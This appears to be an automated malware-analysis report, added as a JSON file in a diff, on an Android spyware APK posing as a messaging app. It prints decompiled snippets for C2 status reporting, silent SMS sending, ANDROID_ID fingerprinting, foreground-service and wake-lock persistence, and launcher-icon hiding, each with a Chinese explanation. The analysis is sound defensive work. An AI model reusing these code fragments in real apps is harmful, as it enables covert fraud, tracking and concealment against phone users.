@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "60231f05a17ca19d8a51c5450cebf7bb1a1bc2464cb88a2530bd933c88f1420c.apk",
+    "sha256": "60231f05a17ca19d8a51c5450cebf7bb1a1bc2464cb88a2530bd933c88f1420c",
+    "包名": "org.steep.episode",
+    "应用名": "Пoсланиe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 255.9
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\steep\\episode\\False;",
+          "method_signature": "a(Context context, Intent intent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "new c(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class False extends BroadcastReceiver {\n      private void a(Context context, Intent intent) {\n>>>         new c(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();\n      }\n  \n      private Object[] a(Bundle bundle) {",
+          "behavior_description": "该代码位于混淆类 False（继承 BroadcastReceiver，配合 pdus 短信Bundle解析）中，是短信发送状态广播的回调处理。当短信发送结果返回时，代码从 Intent 中提取指令参数 id、command、post 以及广播结果码 getResultCode()（标识短信发送成功/失败状态），通过类 c（网络上报模块，模式3）链式构造请求参数后调用 a() 执行，将指令执行状态回传给远程C2服务器，形成\"接收指令→执行短信操作→向C2上报执行结果\"的远程控制闭环，是C2通信信道的关键组成部分。数据流向：Intent extras（id/command/post）与 getResultCode() → 类c发起的网络上报请求（发送至远程C2服务器）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\steep\\episode\\b;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n    try {\n        Exile.a(true);\n        SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n    } catch (Exception e) {\n    }\n}",
+          "malicious_code_snippet_context": "          d(context).setRepeating(0, j, 60000L, PendingIntent.getBroadcast(context, 0, new Intent(context, (Class<?>) Category.class), 134217728));\n      }\n  \n>>>     public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             Exile.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n>>>     }\n  \n      public static void a(Context context, boolean z) {\n          int i = Build.VERSION.SDK_INT >= 19 ? 132 : 4;",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 在后台静默发送短信，目标号码和短信内容均来自方法参数，无需用户知情或确认即可发出，典型用于订阅高额扣费服务或向通讯录联系人传播诈骗短信。数据流向为：外部传入的目标号码与短信内容→SmsManager.sendTextMessage() 静默发送。异常被空 catch 静默吞掉以隐藏发送失败痕迹，且代码位于混淆包名 org.steep.episode 下，结合厂商报告（伪装成 Messages 应用、经虚假 MMS 网站传播并滥用 AccessibilityService 的恶意样本），该行为属于明确的短信欺诈行为，可直接造成用户话费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\steep\\episode\\b;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 10146) {",
+          "behavior_description": "该方法位于混淆包名 org.steep.episode 下（非任何已知第三方库，属于恶意样本自身代码），通过 Settings.Secure.getString 从系统设置数据库中读取 android_id 设备唯一标识符，用于生成设备指纹以唯一标识和追踪受害设备。数据流向：Settings.Secure 系统设置数据库（source）→ 读取 ANDROID_ID → 返回给恶意程序调用方，推测后续被拼接上报至C2服务器用于受害者画像与追踪。结合厂商报告确认该样本为伪装成短信应用、利用 AccessibilityService 隐蔽监控受害者的间谍软件，此设备指纹采集属于其恶意行为链的组成部分。同文件中的 c(Context, long) 方法还包含基于时间间隔（约10秒）反复拉起 Oven 活动（FLAG_ACTIVITY_NEW_TASK）的保活/自启动逻辑，进一步佐证该类的恶意属性。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\steep\\episode\\MatchPortion;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() { public void uncaughtException(Thread thread, Throwable th) {} });\nif (Build.VERSION.SDK_INT >= 26) {\n    startForegroundService(b());\n} else {\n    startService(b());\n}\nthis.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Pigeon\");\nthis.b.setReferenceCounted(false);\nthis.b.acquire();",
+          "malicious_code_snippet_context": "      @Override // android.app.Application\n      public void onCreate() {\n          super.onCreate();\n>>>         Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() { // from class: org.steep.episode.MatchPortion.2\n>>>             @Override // java.lang.Thread.UncaughtExceptionHandler\n>>>             public void uncaughtException(Thread thread, Throwable th) {\n>>>             }\n>>>         });\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             startForegroundService(b());\n>>>         } else {\n>>>             startService(b());\n          }\n          registerReceiver(new False(), new IntentFilter(\"status\"));\n          this.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Pigeon\");",
+          "behavior_description": "该代码位于混淆类 org.steep.episode.MatchPortion 的 Application.onCreate() 中，是恶意样本的驻留初始化逻辑：应用一启动就注册空的未捕获异常处理器（uncaughtException 方法体为空）吞掉所有崩溃，防止进程因异常退出；随后根据系统版本（Build.VERSION.SDK_INT >= 26）调用 startForegroundService() 启动前台服务实现进程保活（适配 Android 8.0 后台限制）；同时通过 PowerManager 获取 PARTIAL_WAKE_LOCK 唤醒锁（newWakeLock(1, \"Pigeon\")），设置 setReferenceCounted(false) 且 acquire() 后永不释放，使 CPU 持续唤醒、设备无法休眠。数据流向：应用启动生命周期回调/系统版本号（source）→ 前台服务启动 + 唤醒锁永久持有（sink）。结合厂商报告（样本伪装成'短信'应用、滥用 AccessibilityService 隐藏自身并监控用户），该保活机制为间谍 payload 提供 24 小时持续驻留、防杀防休眠能力，使其能长期在后台窃听窃取用户数据，属于恶意持久化行为而非正常业务的前台服务。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\steep\\episode\\Courtship;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Courtship.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class Courtship extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Courtship.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该Activity在onCreate()中调用a()方法，通过PackageManager.setComponentEnabledSetting()将自身启动器组件设置为COMPONENT_ENABLED_STATE_DISABLED(2)并附带DONT_KILL_APP(1)，使应用图标从桌面启动器中消失且进程不被杀死，随后立即finish()关闭界面，用户完全无感知。数据流向：应用自身组件信息ComponentName(getApplicationContext(), Courtship.class)→setComponentEnabledSetting()禁用组件。结合厂商报告，该样本伪装成'信息(Сообщениe)'应用并滥用AccessibilityService实施监控，隐藏图标是为了在用户不知情的情况下长期潜伏窃取数据，属于典型的恶意图标隐藏行为，为后续间谍活动提供隐蔽性。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
